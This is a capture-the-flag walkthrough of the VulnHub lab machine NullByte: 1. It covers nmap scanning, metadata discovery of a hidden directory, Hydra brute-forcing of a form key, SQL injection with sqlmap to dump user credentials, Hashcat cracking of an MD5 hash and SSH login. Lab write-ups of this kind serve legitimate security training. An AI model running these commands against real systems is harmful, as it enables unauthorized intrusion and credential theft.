# NullByte: 1

- **Machine:** NullByte: 1
- **Download:** https://www.vulnhub.com/entry/nullbyte-1,126/

![](images/807-1.png)

---

# Setup

1. Extract the downloaded ZIP archive.
2. Import the OVF file into VirtualBox.
3. Click **Finish**.
4. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

```bash
nmap -sn 192.168.2.0/24
```

![](images/807-2.png)

---

## Full Nmap Scan

Run a complete scan to identify all open ports, services, OS information, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.169
```

![](images/807-3.png)

---

## Optional Enumeration

```bash
nmap -v -p- 192.168.2.169
```

```bash
nmap -sC -sV -A 192.168.2.169
```

---

## HTTP Enumeration

Use the HTTP enumeration NSE script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.169
```

![](images/807-4.png)

---

# Web Enumeration

Visit the web application.

```text
http://192.168.2.169
```

Inspect the page source.

![](images/807-5.png)

---

## Image Metadata Analysis

Download the image.

```bash
wget http://192.168.2.169/main.gif
```

Extract metadata.

```bash
exiftool main.gif
```

![](images/807-6.png)

A hidden comment is present.

```text
Comment : P-): kzMb5nVYJw
```

Visit the discovered directory.

```text
http://192.168.2.169/kzMb5nVYJw/
```

---

## Directory Enumeration

Brute-force directories.

```bash
gobuster dir -u http://192.168.2.169/kzMb5nVYJw/ -w /usr/share/wordlists/dirb/common.txt
```

![](images/807-7.png)

---

## Brute Force the Secret Key

Use Hydra to brute-force the key.

```bash
hydra 192.168.2.169 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l "" -P /usr/share/dict/words -t 10 -w 30
```

![](images/807-8.png)

Recovered key:

```text
elite
```

Enter the key at:

```text
http://192.168.2.169/kzMb5nVYJw/index.php
```

![](images/807-9.png)

Press **Enter**.

A search form appears.

![](images/807-10.png)

Enter any value.

![](images/807-11.png)

The application redirects to:

```text
http://192.168.2.169/kzMb5nVYJw/420search.php?usrtosearch=abc
```

![](images/807-12.png)

---

# SQL Injection

Test the parameter for SQL injection.

```text
http://192.168.2.169/kzMb5nVYJw/420search.php?usrtosearch="
```

![](images/807-13.png)

The application is vulnerable to SQL Injection.

---

# Database Enumeration

Enumerate available databases.

```bash
sqlmap -u "http://192.168.2.169/kzMb5nVYJw/420search.php?usrtosearch=abc" --dbs
```

![](images/807-14.png)

---

## Enumerate Tables

```bash
sqlmap -u "http://192.168.2.169/kzMb5nVYJw/420search.php?usrtosearch=abc" -D seth --tables
```

![](images/807-15.png)

---

## Enumerate Columns

```bash
sqlmap -u "http://192.168.2.169/kzMb5nVYJw/420search.php?usrtosearch=abc" -D seth -T users --columns
```

![](images/807-16.png)

---

## Dump User Data

Dump selected columns.

```bash
sqlmap -u "http://192.168.2.169/kzMb5nVYJw/420search.php?usrtosearch=abc" -D seth -T users -C position,user,id,pass --dump
```

![](images/807-17.png)

Or dump the complete table.

```bash
sqlmap -u "http://192.168.2.169/kzMb5nVYJw/420search.php?usrtosearch=abc" -D seth -T users --dump
```

![](images/807-18.png)

Recovered password value:

```text
YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE=
```

---

# Password Cracking

Decode the Base64 value.

```bash
echo 'YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE=' | base64 -d
```

![](images/807-19.png)

Decoded value:

```text
c6d6bd7ebf806f43c76acc3681703b81
```

Identify the hash.

```bash
hash-identifier c6d6bd7ebf806f43c76acc3681703b81
```

![](images/807-20.png)

Save the hash.

```bash
echo "c6d6bd7ebf806f43c76acc3681703b81" > hash.txt
```

Crack it with Hashcat.

```bash
hashcat -m 0 hash.txt /opt/rockyou.txt
```

![](images/807-21.png)

Recovered credentials:

```text
Username : ramses
Password : omega
```

---

# SSH Access

The SSH service is running on port **777**.

Login using the recovered credentials.

```bash
ssh -p 777 ramses@192.168.2.169
```

![](images/807-22.png)

Successfully obtained an interactive SSH shell.

---

# Key Learning

- Inspect image metadata using **ExifTool**.
- Hidden comments may reveal secret directories.
- Brute-force authentication keys with **Hydra**.
- Identify SQL Injection and automate enumeration with **SQLMap**.
- Decode Base64-encoded values before identifying the hash.
- Crack password hashes using **Hashcat**.
- Reuse recovered credentials to gain SSH access.

---

# Summary

The compromise began by inspecting an image's metadata, which revealed a hidden directory. After brute-forcing a secret access key, a search feature vulnerable to SQL Injection was discovered. SQLMap was used to enumerate the database and dump user credentials. The stored password was Base64 encoded and contained an MD5 hash, which was cracked using Hashcat. Finally, the recovered credentials were successfully used to authenticate to the SSH service running on port **777**, providing an interactive shell on the target machine.